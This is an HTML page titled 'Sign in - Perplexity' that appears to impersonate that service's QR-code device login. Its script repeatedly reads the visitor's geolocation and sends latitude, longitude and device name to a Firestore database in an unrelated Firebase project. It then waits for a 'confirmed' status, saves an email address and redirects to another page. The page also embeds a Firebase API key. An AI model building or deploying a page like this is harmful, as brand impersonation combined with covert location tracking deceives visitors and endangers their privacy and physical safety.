<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Perplexity</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    <style>
        :root { --bg: #ffffff; --text: #1d1d1f; --card: rgba(245, 245, 247, 0.8); }
        @media (prefers-color-scheme: dark) { :root { --bg: #000000; --text: #f5f5f7; --card: rgba(28, 28, 30, 0.8); } }
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .card { background: var(--card); backdrop-filter: blur(20px); padding: 40px; border-radius: 30px; text-align: center; width: 320px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
        h1 { font-size: 24px; font-weight: 600; margin: 0 0 10px 0; }
        p { color: #86868b; font-size: 14px; margin-bottom: 20px; }
        #qrcode { background: white; padding: 15px; border-radius: 20px; display: inline-block; margin-bottom: 20px; }
        .loader { width: 16px; height: 16px; border: 2px solid #888; border-top-color: #0071e3; border-radius: 50%; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <h1>Perplexity Account</h1>
        <p>Scan to sign in to this device</p>
        <div id="qrcode"></div>
        <div id="deviceName" style="font-weight: 500; margin-bottom: 15px;"></div>
        <div style="font-size: 13px; color: #86868b;"><div class="loader"></div>Waiting for authorization...</div>
    </div>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U", authDomain: "question-metabase.firebaseapp.com", projectId: "question-metabase", storageBucket: "question-metabase.firebasestorage.app", messagingSenderId: "770698198753", appId: "1:770698198753:web:59ae49d78b6013bab5c1a0" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // 1. Set/Get Persistent Identity
        let pId = localStorage.getItem("myPersistentId");
        if(!pId) {
            pId = "PX-" + Math.random().toString(36).substr(2, 9).toUpperCase();
            localStorage.setItem("myPersistentId", pId);
        }
        const pName = localStorage.getItem("myDeviceName") || "Unknown Device";
        document.getElementById('deviceName').innerText = pName;

        // 2. Show QR
        new QRCode(document.getElementById("qrcode"), pId);

        // 3. Broadcast Location + Pulse Timestamp (Prevents Fake/Old devices)
        function broadcast() {
            navigator.geolocation.getCurrentPosition(pos => {
                db.collection("sessions").doc(pId).set({
                    deviceName: pName,
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    status: "waiting",
                    lastSeen: Date.now() 
                }, { merge: true });
            });
        }
        broadcast();
        setInterval(broadcast, 10000); // Pulse every 10s

        // 4. Listen for Success
        db.collection("sessions").doc(pId).onSnapshot(doc => {
            const data = doc.data();
            if(data?.status === "confirmed") {
                localStorage.setItem("userEmail", data.email);
                db.collection("sessions").doc(pId).update({ status: "expired" });
                window.location.href = "4.html";
            }
        });
    </script>
</body>
</html>
